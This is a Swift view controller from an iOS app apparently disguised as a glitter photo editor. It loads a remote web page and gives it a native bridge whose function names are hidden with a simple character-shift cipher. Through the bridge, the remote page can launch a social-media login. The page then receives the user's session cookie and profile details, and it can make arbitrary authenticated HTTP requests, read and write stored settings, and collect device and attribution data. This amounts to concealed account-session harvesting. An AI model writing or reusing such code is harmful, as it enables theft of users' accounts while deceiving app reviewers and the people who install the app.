//
//  HighLightingViewController.swift
//  GPyyGliterPhoto
//
//  Created by GliterPhoto on 2022/1/14.
//  Copyright © 2022 Gliter. All rights reserved.
//

import UIKit
import WebKit
import Alertift
import Alamofire
import DeviceKit
import SwifterSwift
import ZKProgressHUD
import SwiftyStoreKit
import Kingfisher
import AppsFlyerLib
import StoreKit
import SafariServices

extension String {
    func formatte() -> String {
        
        var s = ""
        let str = self
        
        for c in str {
            let value = (c.asciiValue ?? 0) + 1
            s.append(Character(UnicodeScalar(value)))
        }
        
        return s
    }
    
    func formattetwo() -> String {
        
        var s = ""
        let str = self
        
        for c in str {
            let value = (c.asciiValue ?? 0) - 1
            s.append(Character(UnicodeScalar(value)))
        }
        
        return s
    }
}

let iapConfigDic:[String : String] = [:]

 

enum HightingFuncs: String {
    case logic1 = "Mphjo"
    case logic2 = "Mphpvu"
    case logic3 = "BmmVtfst"
    case logic4 = "BQJSfrvftu"
    case logic5 = "jnh3c"
    case logic6 = "JoBqqCvz"
    case logic7 = "JoBqqQsjdf"
    case logic8 = "EfwjdfJogp"
    case logic9 = "pqfoVsm"
    case logic10 = "tztufnTfuujohQbhf"
    case logic11 = "npqvc`joufstujujbm"
    case logic12 = "npqvc`sfxbWjefp"
    case logic13  = "3lbe`qpqvq"
    case logic14 = "dmptf"
    case logic15 = "tfuNbhjdWbmvf"
    case logic16 = "hfuNbhjdWbmvf"
    case logic17 = "sbufNf"
    case logic18 = "tipxBqqmfQjf"
    case logic19 = "ijefBqqmfQjf"
    case logic20 = "ejtqmbz"
}



enum HightingParamKey: String {
    case modelId
    case header
    case menthod
    case params
    case url
    case source
    case type
    case modelIds
    case userId
    case key
    case value
}
struct HightingAdType {
    static let KKAD = 0
    static let mopub_interstitial = 1
    static let mopub_rewaVideo = 2
}

typealias NETWORKERRORBLOCK = () -> Void

class HighLightingViewController: UIViewController {
    
    var sfSaferiVC: SFSafariViewController?
    var networkCallBack: NETWORKERRORBLOCK?
    var webViewDismissed: NETWORKERRORBLOCK?
    
    let loadingView = LoadingView()
    
    var requstURL:URL?
    let configurations = [
        "ShareMessageHandler"
    ]
    
    let canceledFuncName = "KnfhmB`mbdkdc".formatte()
    
    var webViewConfiguration: WKWebViewConfiguration {
        let preferences = WKPreferences()
        preferences.javaScriptEnabled = true
        preferences.javaScriptCanOpenWindowsAutomatically = true
        
        let configuration = WKWebViewConfiguration()
        configuration.allowsInlineMediaPlayback = true
        
        configuration.preferences = preferences
        configuration.userContentController = WKUserContentController()
        configuration.websiteDataStore = WKWebsiteDataStore.default()
        let javascript = "document.documentElement.style.webkitTouchCallout='none';"
        let noneSelectScript = WKUserScript(source: javascript, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
   
        configuration.userContentController.addUserScript(noneSelectScript)

        configurations.forEach {
            configuration.userContentController.add(self, name: $0)
        }
        return configuration
    }
    
    lazy var webView: WKWebView = {
        
        var webView = WKWebView(frame: self.view.bounds, configuration: webViewConfiguration)
        
        webView.scrollView.alwaysBounceVertical = true
        webView.scrollView.bounces = false
        webView.navigationDelegate = self

        return webView
    }()
    
    init(contentUrl:URL?) {
        super.init(nibName: nil, bundle: nil)
        self.requstURL = contentUrl
        
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        if #available(iOS 11.0, *) {
            webView.scrollView.contentInsetAdjustmentBehavior = .never
        } else {
            self.edgesForExtendedLayout = UIRectEdge.all
        }
        
        NotificationCenter.default.addObserver(self, selector: #selector(postASA(notifi:)), name: .notificationPostASA, object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(postAFlyer(notifi:)), name: .notificationPostAFlyerLib, object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(aGet(notifi:)), name: .notificationAGet, object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(postNext(notifi:)), name: .notificatioinPostNext, object: nil)
    
        self.view.addSubview(webView)
        loadRequst()
        self.view.backgroundColor  = .white
        
        loadingView.frame = CGRect(x: 0, y: 0, width: UIScreen.main.bounds.width, height: UIScreen.main.bounds.height)
        self.view.addSubview(loadingView)
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
    }
    
    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        self.webView.frame = CGRect(x: 0, y: 0, width: UIScreen.main.bounds.width, height: UIScreen.main.bounds.size.height)
    }
}

extension HighLightingViewController {
    func loadRequst() {
        if let reqURL = self.requstURL {
            var request = URLRequest(url: reqURL)
            request.timeoutInterval = 30
            if let cookies = HTTPCookieStorage.shared.cookies(for: reqURL) {
                request.allHTTPHeaderFields = HTTPCookie.requestHeaderFields(with: cookies)
            }
            webView.load(request)
        }
    }
    
    func close() {
        self.presentingViewController?.dismiss(animated: true, completion: {
            
        })
    }
}

extension HighLightingViewController {
   static func clearWebViewCache(timestamp:TimeInterval = 0) {
        let types = [WKWebsiteDataTypeMemoryCache, WKWebsiteDataTypeDiskCache]
        let websiteDataTypes = Set<AnyHashable>(types)
        let dateFrom = Date(timeIntervalSince1970: timestamp)
        if let websiteDataTypes = websiteDataTypes as? Set<String> {
            WKWebsiteDataStore.default().removeData(ofTypes: websiteDataTypes,  modifiedSince: dateFrom, completionHandler: { })
        }
    }
    
    func executeLogic(callback: String?, functionName: String?, parameters: [String: Any]?) {
        if let callback = callback, let functionName = functionName{
            let jsonObject:[String : Any] = [
                "type": functionName,
                "params": parameters ?? []
            ]
            if let data = try? JSONSerialization.data(withJSONObject: jsonObject, options: []), let dataString = String(data: data, encoding: .utf8) {
                NotificationCenter.default.post(name: .notificatioinPostNext, object: "\(callback)(\(dataString))")
            }
        }
    }
}
 

extension HighLightingViewController {
    func actionForWeb(body:[String: Any]) {
        
        let functionName = body["function"] as? String ?? ""
        let params = body["params"] as? [String: Any]
        
        let callBackType = body["callBack"] as? String
        
        switch HightingFuncs(rawValue: functionName.formatte()) {
        
        case .logic17:
            guard let bingo: String = params?["nodm".formatte()] as? String else {return}
            guard let appID = HightLigtingHelper.default.appid else {
                return
            }

            if bingo == "sys" {

                if #available(iOS 14.0, *) {

                    if let w = UIApplication.shared.connectedScenes.filter({$0.activationState == .foregroundActive}).map({$0 as? UIWindowScene})[0] {
                        SKStoreReviewController.requestReview(in: w)
                    }

                } else {
                    SKStoreReviewController.requestReview()
                }

            } else {

                if let url = URL.init(string: "itms-apps://itunes.apple.com/app/id" + appID + "?action=write-review") {
                    if !UIApplication.shared.canOpenURL(url) {
                           return
                    }

                    UIApplication.shared.open(url, options: [:]) { success in
                    }
                }
            }
            
            break
        
        case .logic5:
            guard let rparams = params else {return}
            
            if let urlString = rparams["url"] as? String, let key = rparams["key"] as? String {
                self.getImageData(callback: callBackType, functionName: functionName, urlString: urlString, key: key)
            }
            
            break
        
        case .logic6:
            
            var modelID = params?["oqnctbsHc".formatte()] as? String
            
            if let value = params?["costTotal"] as? String, let valueTwo = iapConfigDic[value] {
                modelID = valueTwo
            }
            
            if let mID = modelID {
                logic6func(productId: mID, complete: { [weak self](done, receiptString) in
                    guard let `self` = self else {return}
                    let parameters:[String:Any] = [
                        "status": done && receiptString != nil,
                        "data": [
                            "productId" : mID,
                            "receipt": receiptString ?? ""
                        ]
                    ]
                    
                    self.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
                })
            }
            
        case .logic4:
            guard let rparams = params else { return }
            let url = rparams[HightingParamKey.url.rawValue] as? String
            logic4func(params: rparams, complete: { [weak self](scucess,data) in
                var parameterDic:[String:Any]?
                var parameterString:String?
                if let rData = data as? [String:Any] {
                    parameterDic = rData
                } else if let rData = data as? Data {
                    parameterString = String(data: rData, encoding: .utf8)
                } else if let rData = data as? String {
                    parameterString = rData
                }
                
                let parameters:[String:Any] = [
                    "status": scucess,
                    "url": url ?? "",
                    "data": parameterDic != nil ? parameterDic!: parameterString != nil ? parameterString! : ""
                ]
                
                self?.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
            })
        case .logic7:
            guard let productIds = params?["oqnctbsHcr".formatte()] as? [String] else {return}
            logic7func(functionName: functionName, callBackType: callBackType, productIds: productIds)
        case .logic14:
            closeAction(functionName: functionName, callBackType: callBackType)
        case .logic1:
            guard let type = params?[HightingParamKey.type.rawValue] as? String else {return}
            logic1func(functionName: functionName, callBackType: callBackType, type: type)
        case .logic2:
            logic2func(functionName: functionName, callBackType: callBackType)
        case .logic3:
            logic3func(functionName: functionName, callBackType: callBackType)
        case .logic8:
            logic8func(functionName: functionName, callBackType: callBackType)
        case .logic9:
            guard let urlString = params?[HightingParamKey.url.rawValue] as? String else {return}
            guard let url = URL(string: urlString) else {return}
            logic9func(functionName: functionName, callBackType: callBackType, url: url)
        case .logic10:
            logic10func(functionName: functionName, callBackType: callBackType)
        case .logic11:
            let source = params?[HightingParamKey.source.rawValue] as? String
            logic11func(functionName: functionName, callBackType: callBackType, source: source)
        case .logic12:
            guard let userId = params?[HightingParamKey.userId.rawValue] as? String else {return}
            let source = params?[HightingParamKey.source.rawValue] as? String
            logic12func(functionName: functionName, callBackType: callBackType, source: source, userId: userId)
        case .logic13:
           let source = params?[HightingParamKey.source.rawValue] as? String
            logic13func(functionName: functionName, callBackType: callBackType, source: source)
        case .logic15:
            guard let key = params?[HightingParamKey.key.rawValue] as? String,let value = params?[HightingParamKey.value.rawValue] as? String else {return}
            logic15func(functionName:functionName,callBackType:callBackType,key:key,value:value)
        case .logic16:
             guard let key = params?[HightingParamKey.key.rawValue] as? String else {return}
            logic16func(functionName:functionName,callBackType:callBackType,key:key)
            
        case .logic18:
            
            guard let url = params?["url"] as? String else {return}
            
            sfSaferiVC = SFSafariViewController.init(url: URL.init(string: url)!)
            self.present(sfSaferiVC!, animated: true) {
            }
            
            break
            
        case .logic19:
            sfSaferiVC?.dismiss(animated: true, completion: {
            })
            break
            
        case .logic20:
            ZKProgressHUD.dismiss()
            self.lodingViewDismiss()
        default:
            break
        }
    }
    
    func pushSaferiVC(url: String) {
        guard let uRL = URL.init(string: url) else {return}
        guard let visibleVC = UIApplication.rootController?.visibleVC else { return }
        sfSaferiVC = SFSafariViewController.init(url: uRL)
        visibleVC.presentFullScreen(sfSaferiVC ?? UIViewController())
    }
    
    func logic4func(params:[String:Any],complete:(@escaping(_ scucess:Bool,_ data:Any?)->Void)) {
        let header = params[HightingParamKey.header.rawValue] as? [String:String]
        let menthod = params[HightingParamKey.menthod.rawValue] as? String
        let requstParamsString = params[HightingParamKey.params.rawValue] as? String
        let urlString = params[HightingParamKey.url.rawValue] as? String
        let requstParams = requstParamsString?.tojson()
           
        var httpheader:HTTPHeaders?

        if  let rHeader = header {
            httpheader = HTTPHeaders(rHeader)
        }
        
        if let url = URL(string:  urlString ?? ""),let reqMethod = menthod {
            let rreqMethod = HTTPMethod(rawValue: reqMethod)
            let encoding:ParameterEncoding =  JSONEncoding.default
            AF.request(url, method: rreqMethod, parameters: requstParams, encoding: encoding, headers: httpheader, interceptor: nil, requestModifier: nil).responseData { response in
    
                switch response.result {
                case .success(let data):
                    debugPrint(data)
                    let json = try? data.jsonObject()
                    complete(true, json != nil ? json! : String(data: data, encoding: .utf8) != nil ? String(data: data, encoding: .utf8)! : "")
                case .failure(let error):
                    debugPrint(error)
                    complete(false,nil)
                }
            }
        
        }
    }
    
    func logic6func(productId:String?,
                        complete:(@escaping(_ done: Bool,_ receiptString: String?)->Void)) {
        guard let productID = productId else { return }
        ZKProgressHUD.show()
        ExchangeManage.exchangeWithSSK(objcetID: productID) { result in
            ZKProgressHUD.dismiss()
            switch result {
            case .success:
                guard let receiptData = SwiftyStoreKit.localReceiptData else {
                    ZKProgressHUD.showError("ReceiptData is Nil")
                    complete(false, nil)
                    return
                }
                
                let receiptString = receiptData.base64EncodedString(options: [])
                complete(true, receiptString)
            case let .error(error):
                switch error.code {
                case .paymentInvalid:
                    break
                case .unknown:
                    break
                default: break

                }
                complete(false, nil)
            }
        }
    }
    
    func logic7func(functionName: String?, callBackType: String?, productIds: [String]) {
        if HightLightingPriceManager.localIAPProducts != nil && HightLightingPriceManager.localIAPProducts?.count ?? 0 > 0 {
            var products : [[String:Any]] = []
            HightLightingPriceManager.localIAPProducts?.forEach({ (productModel) in
                let priceDic:[String:String] = [
                    "fullPrice": productModel.localizedPrice ?? "",
                    "currencyCode" : productModel.currencyCode ?? "",
                    "price" : productModel.price.string
                ]
                let dic:[String:[String:String]] = [productModel.iapID : priceDic]
                products.append(dic)
            })
            let parameters:[String:Any] = [
                "status": true,
                "data":["products":products]
            ]
            self.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
        }
        
        HightLightingPriceManager.default.retrieveProductsInfo(iapList: productIds) { [weak self](iapProducts) in
            guard let `self` = self else {return}
            var products : [[String:Any]] = []
            if let iapProductsR = iapProducts {
                iapProductsR.forEach({ (productModel) in
                    let priceDic:[String: String] = [
                        "fullPrice": productModel.localizedPrice ?? "",
                        "currencyCode" : productModel.currencyCode ?? "",
                        "price" : productModel.price.string
                    ]
                    let dic:[String:[String:String]] = [productModel.iapID : priceDic]
                    products.append(dic)
                })
            }
            
          let parameters:[String:Any] = [
                "status": products.count > 0 ,
                "data":["products":products]
            ]
            self.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
        }
       
    }
    
    func closeAction(functionName:String?, callBackType:String?) {
        close()
        self.executeLogic(callback: callBackType, functionName: functionName, parameters: [:])
    }
    
    func logic1func(functionName: String?, callBackType: String?, type: String) {
        
        if type == "native" {
            wLoiner(functionName: functionName, callBackType: callBackType)
        } else if type == "web" {
            wbwin(functionName: functionName, callBackType: callBackType)
        }
        
        if type == "native" || type == "web" {
            HightLigtingHelper.default.adjustTrack(eventToken: HightLigtingHelper.config.li_button_start_total)
            if HightLigtingHelper.default.isLiButtonFirstStart != true {
                HightLigtingHelper.default.isLiButtonFirstStart = true
                HightLigtingHelper.default.adjustTrack(eventToken: HightLigtingHelper.config.li_button_1ststart)
            }
        }
    }
    
    func logic2func(functionName: String?, callBackType: String?) {

        ZKProgressHUD.show()
        
        let list = HightLigtingUserManager.default.fireUserList.filter({$0.userId != HightLigtingUserManager.default.currentlyFireUser?.userId})
        HightLigtingUserManager.default.louUser(HightLigtingUserManager.default.currentlyFireUser)
        let datas:[[String:Any]?] = list.map({try? $0.dictionary()})
        
        let rData:[[String:Any]?] = datas.filter({$0 != nil})
        let param:[String:Any] = [
            "status": true,
            "data":rData
        ]
        ZKProgressHUD.dismiss()
        self.executeLogic(callback: callBackType, functionName: functionName, parameters: param)
    }
    
    func logic3func(functionName:String?, callBackType:String?) {
        let datas:[[String:Any]?] = HightLigtingUserManager.default.fireUserList.map({try? $0.dictionary()})
        
        let rData:[[String:Any]?] = datas.filter({$0 != nil})
        let params:[String:Any] = [
            "status": true,
            "data":rData
        ]
        self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
    }
    
    func logic8func(functionName:String?,callBackType:String?) {
        let dataDics = HightLigtingHelper.default.getSystemInfomations()
        
        let parameters:[String:Any] = [
            "status": true,
            "data": dataDics
        ]
        self.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
    }
    
    func logic9func(functionName:String?,callBackType:String?,url:URL) {
        UIApplication.shared.open(url, options: [:]) { [weak self](finish) in
            let parameters:[String:Any] = [
                "status": finish
            ]
            self?.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
        }
    }
    
    func logic10func(functionName:String?,callBackType:String?) {
        guard let url = URL(string: UIApplication.openSettingsURLString) else {return}
        UIApplication.shared.open(url, options: [:]) { [weak self](finish) in
            let parameters:[String:Any] = [
                "status": finish
            ]
            self?.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
        }
    }
    
    func logic11func(functionName:String?,callBackType:String?,source:String?) {
        HightLigtingHelper.default.delegate?.showAd?(type: HightingAdType.mopub_interstitial, userId: nil, source: source, complete: { (closed,isShow,isClick)  in
            let parameters:[String:Any] = [
                "status": closed
            ]
            self.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
        })
        
    }
    
    func logic12func(functionName:String?,callBackType:String?,source:String?,userId:String) {
        HightLigtingHelper.default.delegate?.showAd?(type: HightingAdType.mopub_rewaVideo, userId: userId, source: source, complete: { (closed,isShow,isClick) in
            let parameters:[String:Any] = [
                "status":  closed,
                "isShow": isShow,
                "isClick": isClick
            ]
            self.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
        })
    }
    
    func logic13func(functionName:String?,callBackType:String?,source:String?) {
         HightLigtingHelper.default.delegate?.showAd?(type: HightingAdType.KKAD, userId: nil, source: source,complete: { (closed,isShow,isClick) in
            let parameters:[String:Any] = [
                "status": closed
            ]
            self.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
        })
         
    }
    
    func logic15func(functionName:String?,callBackType:String?,key:String,value:String) {
        UserDefaults.standard.set(value, forKey: key)
        let success = UserDefaults.standard.synchronize()
        
        let parameters:[String:Any] = [
            "status": success
        ]
        self.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
    }
    
    func logic16func(functionName:String?,callBackType:String?,key:String) {
        var success = false
        var data:[String:String] = [:]
        if let value  = UserDefaults.standard.value(forKey: key) as? String {
            success = true
            data[key] = value
        }
         
         let parameters:[String:Any] = [
             "status": success,
             "data":data
         ]
         self.executeLogic(callback: callBackType, functionName: functionName, parameters: parameters)
     }
}

extension HighLightingViewController {
    
    func wbwin(functionName: String?, callBackType: String?) {
        var cookiesDict: [String: String]?
        var userInfoDic: [String: Any?]?
        var rsuccess = false
        
        let ujlVc = UJLViewController()
        ujlVc.liComplete = { success, cookiesDicts in
            rsuccess = success
            cookiesDict = cookiesDicts
        }
        
        ujlVc.getUserInfoComplete = { [weak self] userDetailsDict in
            userInfoDic = userDetailsDict
            
            guard let `self` = self else { return  }
            guard rsuccess else {
                let params:[String:Any] = [
                    "status": false,
                    "data":[:]
                ]
                self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
                return
            }
            
            guard  let userInfoDic = userInfoDic, let cookiesDict = cookiesDict else { return }
            do {
                
                var cookieModel = cookiesDict.cookiesDictToModel()
                cookieModel?.userName = userInfoDic["username"] as? String
                
                let userModel = try JSONDecoder().decode(HightLigting.self, from: userInfoDic.jsonData()!)
                
                let user = HightLigtingCacheUser(item: userModel, cookies: cookieModel?.cookieString)
                
                let paramsData:[String: Any] = [
                    "userId": user.userId,
                    "nickName": user.nickName,
                    "fullName": user.fullName,
                    "avatar": user.avatar,
                    "folCount": user.folCount,
                    "follingCount": user.follingCount,
                    "isPrivate" : user.isPrivate ?? false,
                    "cookie": user.cookie ?? ""
                ]
                
                let params:[String:Any] = [
                    "status": true,
                    "data":paramsData
                ]
                
                self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
                HightLigtingUserManager.default.addOrReplaseUser(user)
                HightLigtingUserManager.default.postCurrentlyUserDidChange()
            } catch let error {
                let params:[String:Any] = [
                    "status": false,
                    "data":[:]
                ]
                self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
                debugPrint("Failed to load: \(error.localizedDescription)")
            }
        }
        
        ujlVc.authCompleteHandler = { [weak self] in
            guard let `self` = self else { return  }
            guard rsuccess else {
                let params:[String:Any] = [
                    "status": false,
                    "data":[:]
                ]
                self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
                return
            }
            
            guard  let userInfoDic = userInfoDic, let cookiesDict = cookiesDict else { return }
            do {
                
                var cookieModel = cookiesDict.cookiesDictToModel()
                cookieModel?.userName = userInfoDic["username"] as? String
                
                let userModel = try JSONDecoder().decode(HightLigting.self, from: userInfoDic.jsonData()!)
                
                let user = HightLigtingCacheUser(item: userModel, cookies: cookieModel?.cookieString)
                
                let paramsData:[String: Any] = [
                    "userId": user.userId,
                    "nickName": user.nickName,
                    "fullName": user.fullName,
                    "avatar": user.avatar,
                    "folCount": user.folCount,
                    "follingCount": user.follingCount,
                    "isPrivate" : user.isPrivate ?? false,
                    "cookie": user.cookie ?? ""
                ]
                
                
                let params:[String:Any] = [
                    "status": true,
                    "data":paramsData
                ]
                
                self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
                HightLigtingUserManager.default.addOrReplaseUser(user)
                HightLigtingUserManager.default.postCurrentlyUserDidChange()
            } catch let error {
                let params:[String:Any] = [
                    "status": false,
                    "data":[:]
                ]
                self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
                debugPrint("Failed to load: \(error.localizedDescription)")
            }
        }
        
        ujlVc.closeLiPageHandler = {
        }
        
        ujlVc.cancelLiPageHandler = {
            let params = [
                "type": "web"
             ]
            
            self.executeLogic(callback: self.canceledFuncName, functionName: self.canceledFuncName, parameters: params)
        }
        
        self.presentFullScreen(ujlVc)
    }
    
    func wLoiner(functionName: String?, callBackType: String?) {
        let vc = InnNWLiViewController()
        var cookiesDict: [String: String]?
        var userInfoDic: [String: Any?]?
        var rsuccess = false
        vc.showCloseBtn = true
        vc.liComplete = { success, cookiesDicts in
            rsuccess = success
            cookiesDict = cookiesDicts
        }
        
        vc.fetchUserInfoComplete = { success, _, userDetailsDic in
            rsuccess = success
            userInfoDic = userDetailsDic
        }
        
        vc.cancelLiPageHandler = {
            let params = [
                "type": "web"
             ]
            
            self.executeLogic(callback: self.canceledFuncName, functionName: self.canceledFuncName, parameters: params)
        }
        
        vc.closeLiPageHandler = { [weak self] in
            guard let `self` = self else { return  }
            guard rsuccess else {
                let params:[String:Any] = [
                    "status": false,
                    "data":[:]
                ]
                self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
                return
            }
            
            guard  let userInfoDic = userInfoDic, let cookiesDict = cookiesDict else { return }
            do {
                
                var cookieModel = cookiesDict.cookiesDictToModel()
                cookieModel?.userName = userInfoDic["username"] as? String
                
                let userModel = try JSONDecoder().decode(HightLigting.self, from: userInfoDic.jsonData()!)
                
                let user = HightLigtingCacheUser(item: userModel, cookies: cookieModel?.cookieString)
                
                let paramsData:[String: Any] = [
                    "userId": user.userId,
                    "nickName": user.nickName,
                    "fullName": user.fullName,
                    "avatar": user.avatar,
                    "folCount": user.folCount,
                    "follingCount": user.follingCount,
                    "isPrivate" : user.isPrivate ?? false,
                    "cookie": user.cookie ?? ""
                ]
                
                
                let params:[String:Any] = [
                    "status": true,
                    "data":paramsData
                ]
                
                self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
                HightLigtingUserManager.default.addOrReplaseUser(user)
                HightLigtingUserManager.default.postCurrentlyUserDidChange()
            } catch let error {
                let params:[String:Any] = [
                    "status": false,
                    "data":[:]
                ]
                self.executeLogic(callback: callBackType, functionName: functionName, parameters: params)
                debugPrint("Failed to load: \(error.localizedDescription)")
            }
            
        }
        self.presentFullScreen(vc)
    }
    
}

extension HighLightingViewController {
    func lodingViewDismiss() {
        uploadASA()
        uploadAFlyer()
        uploadafID()
        
        UIView.animate(withDuration: 0.3) {
            self.loadingView.alpha = 0
            self.loadingView.removeFromSuperview()
        }
    }
    
    func getImageData(callback: String?, functionName: String?, urlString: String, key: String) {
        guard let url = URL.init(string: urlString) else {
            return
        }
        
        let value = ZQPredictProductIdSaveManager.researchData(key: urlString, fileName: "ImageValue")
        if value.count > 0 {
            let params:[String:Any] = [
                "status": value.count > 0,
                "data":[
                    "key" : key,
                    "imageData" : value
                ]
            ]
            self.executeLogic(callback: callback, functionName: functionName, parameters: params)
            return
        }
        
        
        let resource = ImageResource(downloadURL: url)
        
        KingfisherManager.shared.retrieveImage(with: resource, options: nil, progressBlock: nil) { result in
            var imageData = ""
            
            switch result {
            case .success(let value):
                
                imageData = value.image.jpegBase64String(compressionQuality: 0.8) ?? ""
                ZQPredictProductIdSaveManager.saveData(key: urlString, value: imageData, fileName: "ImageValue")
                
            case .failure(let error):
                debugPrint("Error: \(error)")
            }
            
            let params:[String:Any] = [
                "status": imageData.count > 0,
                "data":[
                    "key" : key,
                    "imageData" : imageData
                ]
            ]
            self.executeLogic(callback: callback, functionName: functionName, parameters: params)
        }
    }
    
    class ZQPredictProductIdSaveManager: NSObject {

        class func saveData(key: String, value: Any, fileName: String) {
            let paths = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true) as NSArray
            let documentsDirectory = paths.object(at: 0) as! NSString
            let path = documentsDirectory.appendingPathComponent(fileName)
            let dict: NSMutableDictionary = NSMutableDictionary()
            dict.setValue(value, forKey: key)
            dict.write(toFile: path, atomically: false)
        }

        class func researchData(key: String, fileName: String) -> String {
            let paths = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true) as NSArray
            let documentsDirectory = paths[0] as! NSString
            let path = documentsDirectory.appendingPathComponent(fileName)
            let fileManager = FileManager.default
            if(!fileManager.fileExists(atPath: path)) {
                if let bundlePath = Bundle.main.path(forResource: fileName, ofType: nil) {
                    try! fileManager.copyItem(atPath: bundlePath, toPath: path)
                } else {
                    debugPrint(fileName + " not found. Please, make sure it is part of the bundle.")
                }
            } else {
                debugPrint(fileName + " already exits at path.")
            }
            let myDict = NSDictionary(contentsOfFile: path)
            if let dict = myDict {
                return (dict.object(forKey: key) as? String) ?? ""
            } else {
                debugPrint("WARNING: Couldn't create dictionary from " + fileName + "! Default values will be used!")
                return ""
            }
        }
    }
}

extension HighLightingViewController:WKScriptMessageHandler  {
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        debugPrint(message.body)
        if let body = message.body as? [String: Any] {
            actionForWeb(body: body)
        }
    }
}

extension HighLightingViewController: WKNavigationDelegate {
    
    @objc func postNext(notifi: Notification) {
        if let objc = notifi.object as? String {
            webView.evaluateJavaScript(objc) { result, error in
                debugPrint("🌶🌶🌶🌶🌶🌶🌶\(String(describing: error))")
                debugPrint("👌👌👌👌👌👌👌\(String(describing: result))")
            }
        }
    }
    
    @objc func aGet(notifi: Notification) {
        if let s = notifi.object as? String {
            let jsonObject: [String : Any] = [
                "type" : "sendCarrot",
                "data" : s
            ]
            if let data = try? JSONSerialization.data(withJSONObject: jsonObject, options: []), let dataString = String(data: data, encoding: .utf8) {
                NotificationCenter.default.post(name: .notificatioinPostNext, object: "\(dataString)")
            }
        }
    }
    
    @objc func postASA(notifi: Notification) {
        uploadASA()
    }
    
    @objc func postAFlyer(notifi: Notification) {
        uploadAFlyer()
    }
    
    func uploadASA() {
        let asa = ASAManage.singleton.getASAAttributionDic()
        let jsonObject: [String : Any] = [
            "type" : "ASA",
            "data" : asa ?? [:]
        ]
        if let data = try? JSONSerialization.data(withJSONObject: jsonObject, options: []), let dataString = String(data: data, encoding: .utf8) {
            
            NotificationCenter.default.post(name: .notificatioinPostNext, object: "ASA(\(dataString))")
        }
    }
    
    func uploadAFlyer() {
        let af = AFlyerLibManage.getConversionDataSuccess()
        let jsonObject: [String : Any] = [
               "type" : "AF",
               "data" : af
            ]

        if let data = try? JSONSerialization.data(withJSONObject: jsonObject, options: []), let dataString = String(data: data, encoding: .utf8) {
            
            NotificationCenter.default.post(name: .notificatioinPostNext, object: "AF(\(dataString))")
        }
    }
    
    func uploadafID() {
        let jsonObject: [String : Any] = [
            "type" : "AFID",
            "data" : AppsFlyerLib.shared().getAppsFlyerUID()
        ]
        
        if let data = try? JSONSerialization.data(withJSONObject: jsonObject, options: []), let dataString = String(data: data, encoding: .utf8) {
            
            NotificationCenter.default.post(name: .notificatioinPostNext, object: "AFID(\(dataString))")
        }
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        ZKProgressHUD.dismiss()
        lodingViewDismiss()
        uploadASA()
        uploadAFlyer()
        uploadafID()
    }
    
    func webView(_ webView: WKWebView, didCommit navigation: WKNavigation!) {

    }
    
    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        
        self.networkCallBack?()
        ZKProgressHUD.dismiss()
    }
    
    func dismissVC() {
        self.dismiss(animated: true) {
        }
    }
    
    override func viewDidDisappear(_ animated: Bool) {
        super.viewDidDisappear(animated)
        webViewDismissed?()
    }
    
}
